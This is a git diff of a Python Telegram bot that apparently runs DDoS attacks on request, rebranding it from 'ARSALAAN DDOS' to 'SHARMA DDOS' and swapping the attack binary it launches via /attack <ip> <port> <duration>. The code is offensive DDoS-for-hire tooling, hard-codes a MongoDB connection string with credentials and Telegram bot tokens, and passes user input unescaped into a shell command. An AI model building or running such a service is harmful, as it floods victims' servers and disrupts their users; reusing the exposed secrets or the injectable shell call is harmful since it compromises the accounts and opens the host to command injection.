@@ -15,12 +15,12 @@ from datetime import datetime, timedelta, timezone
 MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net'
 client = MongoClient(MONGO_URI)
 db = client['Kamisama']
-users_collection = db['SHANKU']
+users_collection = db['SHANKNBV']
 settings_collection = db['settings0']  # A new collection to store global settings
 redeem_codes_collection = db['redeem_codes0']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7898311586:AAGBiCfnO-YPIp8SVjJirmO744qC6NnRATs'
+TELEGRAM_BOT_TOKEN = '7313487631:AAErLW5fb4-YctOfLRHeYfZ5D8BkywV1t34'
 ADMIN_USER_ID = 6005957043  # Replace with your admin user ID
 
 async def help_command(update: Update, context: CallbackContext):
@@ -60,7 +60,7 @@ async def start(update: Update, context: CallbackContext):
         return
 
     message = (
-        "*🔥 Welcome to ARSALAAN DDOS world 🔥*\n\n"
+        "*🔥 Welcome to SHARMA DDOS world 🔥*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
         "*Let the war begin! ⚔️💥*"
     )
@@ -158,7 +158,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} 900",
+            f"./bgmiv1 {ip} {port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
